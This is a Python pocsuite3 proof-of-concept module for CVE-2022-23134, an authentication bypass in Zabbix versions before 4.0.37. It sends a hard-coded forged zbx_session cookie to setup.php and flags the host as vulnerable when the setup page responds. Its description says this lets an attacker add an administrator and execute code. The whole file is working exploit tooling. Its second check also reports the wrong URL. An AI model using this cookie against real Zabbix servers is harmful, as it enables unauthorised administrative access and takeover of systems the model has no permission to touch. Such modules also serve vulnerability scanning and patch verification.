from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
class DemoPOC(POCBase):
    vulID = 'CVE-2022-23134'  # ssvid
    version = '1.0'
    name = 'Zabbix setup.php 认证绕过'
    appName = 'Zabbix'
    appVersion = '<4.0.37'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''攻击者可构造cookie，伪造身份访问setup.php，从而通过设置新数据库配置新增管理员账号，最终可登录Zabbix，造成敏感信息泄漏，以及任意代码执行。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    def _verify(self):#验证模式
        result = {}
        headers = {
            'Cookie': "zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D"
        }
        try:
            target = self.url+"/zabbix/setup.php"
            target1 = self.url+"/setup.php"
            r = requests.get(url=target,timeout=8,verify=False,headers=headers)
            r1 = requests.get(url=target1,timeout=8,verify=False,headers=headers)
            if r.status_code == 200 and "Database" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
                
            elif r1.status_code == 200 and "Database" in r1.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)            	
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)